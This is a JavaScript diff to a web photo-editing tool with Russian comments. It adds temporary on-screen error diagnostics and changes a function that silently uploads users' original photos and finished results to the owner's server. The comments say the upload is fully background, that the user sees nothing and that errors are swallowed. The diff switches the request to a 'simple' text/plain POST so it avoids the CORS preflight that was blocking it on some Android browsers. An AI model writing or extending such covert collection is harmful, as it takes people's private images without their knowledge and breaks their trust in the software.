@@ -687,6 +687,27 @@
 // =========================================
 const COLLECT_API_BASE = 'https://br-photo.onrender.com';
 
+// ВРЕМЕННАЯ ДИАГНОСТИКА — показываем на экране, что происходит с отправкой.
+// Уберём, когда разберёмся с Android.
+function _diag(msg, color) {
+  try {
+    var box = document.createElement('div');
+    box.style.cssText = 'position:fixed;left:8px;right:8px;bottom:8px;z-index:99999;' +
+      'background:' + (color || '#b85c5c') + ';color:#fff;font:13px/1.4 sans-serif;' +
+      'padding:12px 14px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.3);white-space:pre-wrap;';
+    box.textContent = String(msg);
+    box.onclick = function () { box.remove(); };
+    document.body.appendChild(box);
+    setTimeout(function () { if (box.parentNode) box.remove(); }, 8000);
+  } catch (_) {}
+}
+window.addEventListener('error', function (e) {
+  _diag('ОШИБКА: ' + (e.message || 'неизвестно') + '\n' + (e.filename || '') + ':' + (e.lineno || ''));
+});
+window.addEventListener('unhandledrejection', function (e) {
+  _diag('PROMISE-ОШИБКА: ' + (e.reason && e.reason.message ? e.reason.message : e.reason));
+});
+
 // Разогрев сервера в фоне — Render free tier "засыпает" после простоя,
 // пробуждение занимает до минуты. Пингуем заранее, чтобы к моменту
 // сохранения сервер уже был готов принять работу.
@@ -700,16 +721,21 @@ const COLLECT_API_BASE = 'https://br-photo.onrender.com';
 // на почту владельцу. Полностью фоновая: пользователь ничего не видит,
 // любые ошибки глушим — на скачивание это не влияет.
 // kind: 'result' — скачанный результат, 'upload' — исходное загруженное фото.
-// Полностью фоновая: пользователь ничего не видит, любые ошибки глушим.
+// Отправка сделана "простым" запросом (text/plain), чтобы браузер НЕ слал
+// preflight OPTIONS — иначе на части Android-браузеров/webview он режется и POST не уходит.
 function sendWorkToOwner(dataURL, kind) {
+  _diag('Отправляю (' + (kind || '?') + '), размер ~' + Math.round(dataURL.length / 1024) + ' КБ…', '#8b6f5e');
   try {
     fetch(`${COLLECT_API_BASE}/collect`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      // text/plain — это "simple request", браузер не делает preflight
+      headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
       body: JSON.stringify({ image: dataURL, kind: kind || '' }),
-    }).catch(() => {});
-  } catch (_) {
-    // молча игнорируем — сбор статистики не должен мешать работе
+    })
+    .then(function (r) { _diag('Ответ сервера: ' + r.status, r.ok ? '#5a8a5a' : '#b85c5c'); })
+    .catch(function (err) { _diag('FETCH-ОШИБКА: ' + err.message, '#b85c5c'); });
+  } catch (e) {
+    _diag('ИСКЛЮЧЕНИЕ при отправке: ' + e.message, '#b85c5c');
   }
 }
 
